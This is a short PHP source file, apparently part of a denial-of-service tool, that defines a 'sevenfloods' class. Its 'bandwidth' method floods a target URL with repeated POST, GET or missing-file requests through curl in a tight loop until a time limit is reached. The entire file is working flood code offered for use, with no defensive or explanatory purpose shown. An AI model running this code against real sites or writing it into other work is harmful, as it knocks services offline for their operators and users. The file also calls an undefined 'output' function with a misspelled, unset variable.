<?php
class sevenfloods{
	function bandwidth($ip, $starttime, $method, $max_time, $exec_time){
		while(1){ 
			try{
				$packets++; 
				if(time() > $max_time){
					output($packets, $starttime, $exec_time, $lenght);
					break; 
				}
				if($method=="POST"){
					$ch = curl_init();  
					curl_setopt($ch, CURLOPT_URL, $ip);
					curl_setopt($ch, CURLOPT_HEADER, 0);
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
					curl_setopt($ch, CURLOPT_POSTFIELDS, "CICA");
					
					$login = curl_exec($ch);
				}
				if($method=="GET"){
					$ch = curl_init();  
					curl_setopt($ch, CURLOPT_URL, $ip);
					curl_setopt($ch, CURLOPT_HEADER, 0);
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
					
					$login = curl_exec($ch);
				}
				if($method=="404"){
					$ch = curl_init();  
					curl_setopt($ch, CURLOPT_URL, $ip . "/x.gif");
					curl_setopt($ch, CURLOPT_HEADER, 0);
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
					
					$login = curl_exec($ch);
				}
			}catch (Exception $e){
				echo $e;
			}
		}
	}
}
?>